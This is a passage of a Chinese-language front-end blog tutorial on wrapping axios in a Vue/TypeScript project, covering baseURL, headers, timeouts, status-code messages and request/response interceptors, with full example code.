class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// http.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> axios <span class=\"keyword\">from</span> <span class=\"string\">'axios'</span></span><br><span class=\"line\"><span class=\"comment\">// 创建 axios 实例</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> service = axios.create(&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 配置项</span></span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"根据环境设置-baseURL\"><a href=\"#根据环境设置-baseURL\" class=\"headerlink\" title=\"根据环境设置 baseURL\"></a>根据环境设置 baseURL</h3><p>baseURL 属性是请求地址前缀，将自动加在 url 前面，除非 url 是个绝对地址。正常情况下，在开发环境下和生产模式下有着不同的 baseURL，所以，我们需要根据不同的环境切换不同的 baseURL。</p>\n<p>在开发模式下，由于有着 devServer 的存在，需要根据固定的 url 前缀进行请求地址重写，所以，在开发环境下，将 baseURL 设为某个固定的值，比如：<code>/apis</code>。</p>\n<p>在生产模式下，根据 Java 模块的请求前缀的不同，可以设置不同的 baseURL。</p>\n<p>具体代码如下：</p>\n<figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 根据 process.env.NODE_ENV 区分状态，切换不同的 baseURL</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> service = axios.create(&#123;</span><br><span class=\"line\">\tbaseURL: <span class=\"built_in\">process</span>.env.NODE_ENV === <span class=\"string\">'production'</span> ? `/java` : <span class=\"string\">'/apis'</span>,</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"统一设置请求头\"><a href=\"#统一设置请求头\" class=\"headerlink\" title=\"统一设置请求头\"></a>统一设置请求头</h3><p>在这里和大家聊一个问题，什么是封装？在我看来，封装是通过更少的调用代码覆盖更多的调用场景。</p>\n<p>由于，大部分情况下，请求头都是固定的，只有少部分情况下，会需要一些特殊的请求头，所以，在这里，我采用的方案是，将普适性的请求头作为基础配置。当需要特殊请求头时，将特殊请求头作为参数传入，覆盖基础配置。</p>\n<p>代码如下：</p>\n<figure class=\"highlight actionscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> service = axios.create(&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">\theaders: &#123;</span><br><span class=\"line\">        <span class=\"keyword\">get</span>: &#123;</span><br><span class=\"line\">          <span class=\"string\">'Content-Type'</span>: <span class=\"string\">'application/x-www-form-urlencoded;charset=utf-8'</span></span><br><span class=\"line\">          <span class=\"comment\">// 在开发中，一般还需要单点登录或者其他功能的通用请求头，可以一并配置进来</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        post: &#123;</span><br><span class=\"line\">          <span class=\"string\">'Content-Type'</span>: <span class=\"string\">'application/json;charset=utf-8'</span></span><br><span class=\"line\">          <span class=\"comment\">// 在开发中，一般还需要单点登录或者其他功能的通用请求头，可以一并配置进来</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"跨域、超时、响应码处理\"><a href=\"#跨域、超时、响应码处理\" class=\"headerlink\" title=\"跨域、超时、响应码处理\"></a>跨域、超时、响应码处理</h3><p>axios 中，提供是否允许跨域的属性——withCredentials，以及配置超时时间的属性——timeout，通过这两个属性，可以轻松处理跨域和超时的问题。</p>\n<p>下面，我们来说说响应码处理：</p>\n<p>axios 提供了 validateStatus 属性，用于定义对于给定的 HTTP 响应状态码是 resolve 或 reject promise。所以，正常设置的情况下，我们会将状态码为 2 系列或者 304 的请求设为 resolve 状态，其余为 reject 状态。结果就是，我们可以在业务代码里，使用 catch 统一捕获响应错误的请求，从而进行统一处理。</p>\n<p>但是，由于我在代码里面使用了 async-await，而众所周知，async-await 捕获 catch 的方式极为麻烦，所以，在此处，我选择将所有响应都设为 resolve 状态，统一在 then 处理。</p>\n<p>此部分代码如下：</p>\n<figure class=\"highlight actionscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> service = axios.create(&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 跨域请求时是否需要使用凭证</span></span><br><span class=\"line\">\twithCredentials: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    <span class=\"comment\">// 请求 30s 超时</span></span><br><span class=\"line\">\ttimeout: <span class=\"number\">30000</span>,</span><br><span class=\"line\">\tvalidateStatus: <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// 使用async-await，处理reject情况较为繁琐，所以全部返回resolve，在业务代码中处理异常</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"请求、响应处理\"><a href=\"#请求、响应处理\" class=\"headerlink\" title=\"请求、响应处理\"></a>请求、响应处理</h3><p>在不使用 axios 的情况下，每次请求或者接受响应，都需要将请求或者响应序列化。</p>\n<p>而在 axios 中， <code>transformRequest</code> 允许在向服务器发送请求前，修改请求数据；<code>transformResponse</code> 在传递给 then/catch 前，允许修改响应数据。</p>\n<p>通过这两个钩子，可以省去大量重复的序列化代码。</p>\n<p>代码如下：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> service = axios.create(&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 在向服务器发送请求前，序列化请求数据</span></span><br><span class=\"line\">    transformRequest: [function (<span class=\"keyword\">data</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">data</span> = JSON.stringify(<span class=\"keyword\">data</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">data</span></span><br><span class=\"line\">    &#125;],</span><br><span class=\"line\">    <span class=\"comment\">// 在传递给 then/catch 前，修改响应数据</span></span><br><span class=\"line\">    transformResponse: [function (<span class=\"keyword\">data</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (typeof <span class=\"keyword\">data</span> === <span class=\"string\">'string'</span> &amp;&amp; <span class=\"keyword\">data</span>.startsWith(<span class=\"string\">'&#123;'</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">data</span> = JSON.parse(<span class=\"keyword\">data</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">data</span></span><br><span class=\"line\">    &#125;]</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"拦截器\"><a href=\"#拦截器\" class=\"headerlink\" title=\"拦截器\"></a>拦截器</h3><p>拦截器，分为请求拦截器以及响应拦截器，分别在请求或响应被 then 或 catch 处理前拦截它们。</p>\n<p>之前提到过，由于 async-await 中 catch 难以处理的问题，所以将出错的情况也作为 resolve 状态进行处理。但这带来了一个问题，请求或响应出错的情况下，结果没有数据协议中定义的 msg 字段（消息）。所以，我们需要在出错的时候，手动生成一个符合返回格式的返回数据。</p>\n<p>由于，在业务中，没有需要在请求拦截器中做额外处理的需求，所以，请求拦截器的 resolve 状态，只需直接返回就可以了。</p>\n<p>请求拦截器代码如下：</p>\n<figure class=\"highlight moonscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 请求拦截器</span><br><span class=\"line\">service.interceptors.request.use(<span class=\"function\"><span class=\"params\">(config)</span> =&gt;</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> config</span><br><span class=\"line\">&#125;, <span class=\"function\"><span class=\"params\">(<span class=\"built_in\">error</span>)</span> =&gt;</span> &#123;</span><br><span class=\"line\">\t// 错误抛到业务代码</span><br><span class=\"line\">    <span class=\"built_in\">error</span>.data = &#123;&#125;</span><br><span class=\"line\">    <span class=\"built_in\">error</span>.data.msg = <span class=\"string\">'服务器异常，请联系管理员！'</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> Promise.resolve(<span class=\"built_in\">error</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p>再来聊聊响应拦截器，还是之前的那个问题，除了请求或响应错误，还有一种情况也会导致返回的消息体不符合协议规范，那就是状态码不为 2 系列或 304 时。此时，我们还是需要做一样的处理——手动生成一个符合返回格式的返回数据。但是，有一点不一样，我们还需要根据不同的状态码生成不同的提示信息，以方便处理上线后的问题。</p>\n<p>响应拦截器代码如下：</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 根据不同的状态码，生成不同的提示信息</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> showStatus = <span class=\"function\">(<span class=\"params\">status</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> message = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"comment\">// 这一坨代码可以使用策略模式进行优化</span></span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (status) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">400</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'请求错误(400)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">401</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'未授权，请重新登录(401)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">403</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'拒绝访问(403)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">404</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'请求出错(404)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">408</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'请求超时(408)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">500</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'服务器错误(500)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">501</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'服务未实现(501)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">502</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'网络错误(502)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">503</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'服务不可用(503)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">504</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'网络超时(504)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">505</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'HTTP版本不受支持(505)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            message = <span class=\"string\">`连接出错(<span class=\"subst\">$&#123;status&#125;</span>)!`</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">`<span class=\"subst\">$&#123;message&#125;</span>，请检查网络或联系管理员！`</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 响应拦截器</span></span><br><span class=\"line\">service.interceptors.response.use(<span class=\"function\">(<span class=\"params\">response</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> status = response.status</span><br><span class=\"line\">    <span class=\"keyword\">let</span> msg = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (status &lt; <span class=\"number\">200</span> || status &gt;= <span class=\"number\">300</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 处理http错误，抛到业务代码</span></span><br><span class=\"line\">        msg = showStatus(status)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> response.data === <span class=\"string\">'string'</span>) &#123;</span><br><span class=\"line\">            response.data = &#123; msg &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            response.data.msg = msg</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> response</span><br><span class=\"line\">&#125;, <span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 错误抛到业务代码</span></span><br><span class=\"line\">    error.data = &#123;&#125;</span><br><span class=\"line\">    error.data.msg = <span class=\"string\">'请求超时或服务器异常，请检查网络或联系管理员！'</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.resolve(error)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p><em>tips1：友情提示，上面那一坨 switch-case 代码，可以使用策略模式进行优化~</em></p>\n<p><em>tips2：如果有一些业务相关的需求，可以加在拦截器中，比如：loading、鉴权等~</em></p>\n<h3 id=\"支持-TypeScript\"><a href=\"#支持-TypeScript\" class=\"headerlink\" title=\"支持 TypeScript\"></a>支持 TypeScript</h3><p>由于前段时间，我在部门内推了 TypeScript，为了满足自己的强迫症，将所有 js 文件改写为了 ts 文件。由于 axios 本身有 TypeScript 相关的支持，所以只需要把对应的类型导入，然后赋值即可。</p>\n<h3 id=\"完整代码\"><a href=\"#完整代码\" class=\"headerlink\" title=\"完整代码\"></a>完整代码</h3><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// http.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> axios, &#123; AxiosRequestConfig, AxiosResponse &#125; <span class=\"keyword\">from</span> <span class=\"string\">'axios'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> showStatus = <span class=\"function\">(<span class=\"params\">status: <span class=\"built_in\">number</span></span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> message = <span class=\"string\">''</span></span><br><span class=\"line\">  <span class=\"keyword\">switch</span> (status) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">400</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'请求错误(400)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">401</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'未授权，请重新登录(401)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">403</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'拒绝访问(403)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">404</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'请求出错(404)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">408</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'请求超时(408)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">500</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'服务器错误(500)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">501</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'服务未实现(501)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">502</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'网络错误(502)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">503</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'服务不可用(503)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">504</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'网络超时(504)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">505</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'HTTP版本不受支持(505)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">      message = <span class=\"string\">`连接出错(<span class=\"subst\">$&#123;status&#125;</span>)!`</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">`<span class=\"subst\">$&#123;message&#125;</span>，请检查网络或联系管理员！`</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> service = axios.create(&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 联调</span></span><br><span class=\"line\">  baseURL: process.env.NODE_ENV === <span class=\"string\">'production'</span> ? <span class=\"string\">`/`</span> : <span class=\"string\">'/apis'</span>,</span><br><span class=\"line\">  headers: &#123;</span><br><span class=\"line\">    <span class=\"keyword\">get</span>: &#123;</span><br><span class=\"line\">      <span class=\"string\">'Content-Type'</span>: <span class=\"string\">'application/x-www-form-urlencoded;charset=utf-8'</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    post: &#123;</span><br><span class=\"line\">      <span class=\"string\">'Content-Type'</span>: <span class=\"string\">'application/json;charset=utf-8'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"comment\">// 是否跨站点访问控制请求</span></span><br><span class=\"line\">  withCredentials: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  timeout: <span class=\"number\">30000</span>,</span><br><span class=\"line\">  transformRequest: [<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    data = <span class=\"built_in\">JSON</span>.stringify(data)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\">  &#125;],</span><br><span class=\"line\">  validateStatus () &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 使用async-await，处理reject情况较为繁琐，所以全部返回resolve，在业务代码中处理异常</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  transformResponse: [<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> data === <span class=\"string\">'string'</span> &amp;&amp; data.startsWith(<span class=\"string\">'&#123;'</span>)) &#123;</span><br><span class=\"line\">      data = <span class=\"built_in\">JSON</span>.parse(data)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\">  &#125;]</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 请求拦截器</span></span><br><span class=\"line\">service.interceptors.request.use(<span class=\"function\">(<span class=\"params\">config: AxiosRequestConfig</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> config</span><br><span class=\"line\">&#125;, <span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 错误抛到业务代码</span></span><br><span class=\"line\">    error.data = &#123;&#125;</span><br><span class=\"line\">    error.data.msg = <span class=\"string\">'服务器异常，请联系管理员！'</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.resolve(error)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 响应拦截器</span></span><br><span class=\"line\">service.interceptors.response.use(<span class=\"function\">(<span class=\"params\">response: AxiosResponse</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> status = response.status</span><br><span class=\"line\">    <span class=\"keyword\">let</span> msg = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (status &lt; <span class=\"number\">200</span> || status &gt;= <span class=\"number\">300</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 处理http错误，抛到业务代码</span></span><br><span class=\"line\">        msg = showStatus(status)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> response.data === <span class=\"string\">'string'</span>) &#123;</span><br><span class=\"line\">            response.data = &#123;msg&#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            response.data.msg = msg</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> response</span><br><span class=\"line\">&#125;, <span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 错误抛到业务代码</span></span><br><span class=\"line\">    error.data = &#123;&#125;</span><br><span class=\"line\">    error.data.msg = <span class=\"string\">'请求超时或服务器异常，请检查网络或联系管理员！'</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.resolve(error)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> service</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>虽然，axios 是个优秀的 HTTP 库，但是，直接在项目中使用并不是那么方便，所以，我们需要对其进行一定程度上的配置封装，减少重复代码，方便调用。</p>","more":"<h3 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h3><p>其实，网上关于 axios 封装的代码不少，但是大部分都是在入口文件（main.js）中进行 axios 全局对象属性定义的形式进行配置，类似于如下代码：</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios<span class=\"selector-class\">.defaults</span><span class=\"selector-class\">.timeout</span> = <span class=\"number\">10000</span></span><br></pre></td></tr></table></figure>\n<p>该方案有两个不足，首先，axios 封装代码耦合进入入口文件，不方便后期维护；其次，使用 axios 全局对象属性定义的方式进行配置，代码过于零散。</p>\n<p>针对问题一，我使用了 Vue 源码结构中的一大核心思想——将功能拆分为文件，方便后期的维护。单独创建一个 <code>http.js</code> 